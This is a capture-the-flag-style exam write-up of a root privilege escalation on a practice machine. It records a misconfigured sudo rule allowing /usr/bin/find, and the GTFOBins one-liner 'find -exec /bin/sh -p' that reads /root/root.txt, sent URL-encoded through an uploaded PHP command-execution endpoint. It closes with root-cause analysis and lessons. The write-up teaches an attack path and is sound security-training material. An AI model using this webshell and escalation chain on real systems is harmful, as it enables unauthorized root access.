---
type: machine-phase
project: OSCP-Exam-PoC
machine: VE-01
difficulty: Very Easy
phase: privilege-escalation
status: completed
initial_user: www-data
privilege_escalation: Sudo Misconfiguration
vulnerable_binary: /usr/bin/find
technique: GTFOBins find -exec
root_flag_path: /root/root.txt
target: x.x.x.x
http_port: PORT_L
root_flag_submitted: true
tags:
  - oscp
  - ve-01
  - privilege-escalation
  - linux
  - sudo
  - find
  - gtfo
---

# VE-01 — Root Privilege Escalation

> **Flag completion:** Root flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

The examination's second objective was:

> Escalate to root on VE-01 and submit the contents of `/root/root.txt`.

The challenge explicitly required successful completion of the user-level objective first.

At the beginning of this phase, the following had already been established:

|Property|Value|
|---|---|
|Initial access mechanism|PHP command execution|
|Execution account|`www-data`|
|Target hostname|`veryeasy`|
|Target IP|`x.x.x.x`|
|HTTP port|`PORT_L`|
|User account|`user`|
|User objective|Completed|

The existing PHP command-execution endpoint remained available:

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=
```

No separate SSH session or reverse shell was required.

## 2. Privilege Escalation Enumeration

### 2.1 Inspect Sudo Permissions

The first enumeration step was to inspect the sudo permissions of the current execution account.

Command:

```
sudo -l
```

It was executed through the PHP endpoint using:

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=sudo%20-l
```

### 2.2 Captured Output

The target returned:

```
Matching Defaults entries for www-data on veryeasy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, !requiretty

User www-data may run the following commands on veryeasy:
    (ALL) NOPASSWD: /usr/bin/find
```

### 2.3 Interpret the Finding

The critical sudoers entry was:

```
(ALL) NOPASSWD: /usr/bin/find
```

Its components:

|Component|Meaning|
|---|---|
|`www-data`|Account permitted to execute the command|
|`(ALL)`|Command may run as any target user|
|`NOPASSWD`|No password authentication is required|
|`/usr/bin/find`|Permitted executable|

Without an explicit `-u` option, sudo normally executes the command as root.

Consequently, the web application's `www-data` account could execute GNU `find` with root privileges.

## 3. Vulnerability Analysis

### 3.1 Why GNU find Was Dangerous Here

The weakness was not an outdated version of GNU `find`.

The problem was the combination of:

1. An unrestricted sudo permission for the binary.
    
2. Root execution privileges.
    
3. GNU `find`'s `-exec` functionality.
    

The `-exec` action allows `find` to execute another program.

Because `find` was authorized to run as root, the command launched through `-exec` inherited the privileged execution context.

This converted a restricted-looking sudo permission into arbitrary command execution with effective root privileges.

### 3.2 Relevant Functionality

The relevant option was:

```
-exec command {} \;
```

For this exploitation chain, the command supplied to `-exec` was a shell:

```
/bin/sh -p -c '...'
```

The `-p` option instructs the shell to preserve its privileged effective identity rather than dropping it.

Reference:

[GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)

## 4. Exploitation

### 4.1 Exact Command Used

The command recorded in the examination record was:

```
sudo /usr/bin/find . -exec /bin/sh -p -c 'id; cat /root/root.txt' \; -quit
```

It was executed through the PHP command-execution endpoint.

Exact URL:

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=sudo%20/usr/bin/find%20.%20-exec%20/bin/sh%20-p%20-c%20%27id%3B%20cat%20/root/root.txt%27%20%5C%3B%20-quit
```

### 4.2 Payload Breakdown

|Component|Purpose|
|---|---|
|`sudo`|Execute the permitted binary with elevated privileges|
|`/usr/bin/find`|Binary explicitly permitted by sudoers|
|`.`|Starting directory for the search|
|`-exec`|Execute an external command|
|`/bin/sh`|Launch the system shell|
|`-p`|Preserve the effective privileged identity|
|`-c`|Execute the supplied command string|
|`id`|Display the current process identity|
|`cat /root/root.txt`|Read the root flag|
|`\;`|Terminate the `-exec` expression|
|`-quit`|Stop the `find` operation immediately|

### 4.3 Expected Privilege Evidence

The expected identity output for this payload is:

```
uid=33(www-data) gid=33(www-data) euid=0(root) ...
```

The important field is:

```
euid=0(root)
```

This indicates effective root privileges.

The real UID remains `www-data`, while the effective UID is root.

**Evidence distinction:** This output is the expected result, not a captured response. The actual complete response from the exploitation URL was not preserved in the examination record.

## 5. Root Flag Retrieval

The payload directly attempted to read:

```
/root/root.txt
```

I reported that the flag was retrieved and submitted, and moved on to EA-01.

This indicates that both VE-01 objectives had been completed before moving to EA-01 (obtained and submitted; participant-confirmed).

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

No flag value should be reconstructed or guessed.

## 6. Complete Privilege Escalation Chain

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/ve-01-root-attack-chain-mobile.svg" />
    <img src="/diagrams/ve-01-root-attack-chain.svg" alt="VE-01 eleven-stage root privilege-escalation chain: PHP command execution as www-data, sudo -l, NOPASSWD /usr/bin/find, GNU find -exec, sudo find, /bin/sh -p, expected effective UID 0, retrieval of /root/root.txt, root flag submission and VE-01 completion. The raw privileged command response was not retained." width="760" height="1758" loading="lazy" decoding="async" />
  </picture>
  <figcaption>All 11 original steps preserved. The <code>euid=0(root)</code> output is expected rather than captured; see section 4 for the exact recorded payload. Root flag submission is participant-confirmed.</figcaption>
</figure>

## 7. Root-Cause Assessment

|Property|Assessment|
|---|---|
|Vulnerability class|Sudo misconfiguration|
|Affected account|`www-data`|
|Permitted executable|`/usr/bin/find`|
|Authentication requirement|None|
|Privilege boundary crossed|`www-data` to root|
|Exploitation mechanism|GNU find `-exec`|
|Required local access|Existing PHP command execution|
|Kernel exploit required|No|
|CVE required|No|
|Final result|Root objective completed|

**Primary root cause:** The sudoers configuration granted `www-data` unrestricted passwordless execution of a binary whose functionality could be used to execute arbitrary commands.

The machine did not require a kernel exploit, a vulnerable package version, or a separate authentication bypass to complete this privilege-escalation stage.

## 8. Lessons Learned

### 8.1 Always Inspect Sudo Permissions Early

A simple:

```
sudo -l
```

revealed the intended privilege-escalation path immediately.

This was substantially more useful than beginning with indiscriminate exploit searches.

### 8.2 A Restricted Binary Can Still Provide Arbitrary Execution

Sudo restrictions are only meaningful when the permitted program's functionality is also constrained.

A binary such as `find` can execute other programs through its built-in options.

### 8.3 Distinguish Real and Effective User IDs

When analyzing privilege escalation, `uid` and `euid` are not interchangeable.

The expected evidence:

```
uid=33(www-data) euid=0(root)
```

shows that the process retains its original real identity while operating with effective root privileges.

### 8.4 In-Band Execution Can Be Enough

The same PHP endpoint used for initial access was sufficient to execute the privilege-escalation payload and retrieve the root flag.

An interactive shell was unnecessary.

## 9. Evidence Register

|Evidence ID|Description|Status|
|---|---|---|
|VE-01-R01|Initial execution account|`www-data` confirmed|
|VE-01-R02|`sudo -l` command|Recorded|
|VE-01-R03|Complete sudoers output|Recorded|
|VE-01-R04|`/usr/bin/find` permission|Confirmed|
|VE-01-R05|Exact exploitation command|Recorded|
|VE-01-R06|URL-encoded exploitation request|Recorded|
|VE-01-R07|Expected effective UID evidence|Documented as expected, raw output missing|
|VE-01-R08|Root flag retrieval|Successful completion confirmed|
|VE-01-R09|Root flag value| Obtained and submitted (participant-confirmed) |
|VE-01-R10|Raw exploitation response|Not retained|

## 10. Completion Checklist

- User objective completed first
    
- Initial execution context established
    
- Sudo permissions enumerated
    
- Misconfigured sudo rule identified
    
- Dangerous functionality identified
    
- Exact exploitation command preserved
    
- URL-encoded request preserved
    
- Root flag retrieval completed
    
- Root flag submitted
    
- Raw root exploitation response attached
    
- Root flag value recovered from original evidence
    

**Phase result:** Root objective completed successfully. VE-01 is fully documented at the attack-chain level, with the original upload mechanics and raw flag outputs remaining as evidence gaps.